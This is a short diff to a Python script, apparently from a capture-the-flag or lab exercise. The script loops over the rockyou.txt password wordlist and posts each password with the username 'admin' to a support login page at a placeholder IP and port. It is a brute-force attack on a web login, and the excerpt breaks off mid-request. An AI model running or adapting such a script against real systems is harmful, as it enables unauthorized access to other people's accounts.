@@ -2,7 +2,7 @@
 
 import requests 
 
-file = open("../Downloads/rockyou.txt","r",errors="ignore").read().split("\n")
+file = open("rockyou.txt","r",errors="ignore").read().split("\n")
 for password in file:
 	r = requests.post("http://<IP>:<PORT>/support/index.php",data={
 		"username":"admin",
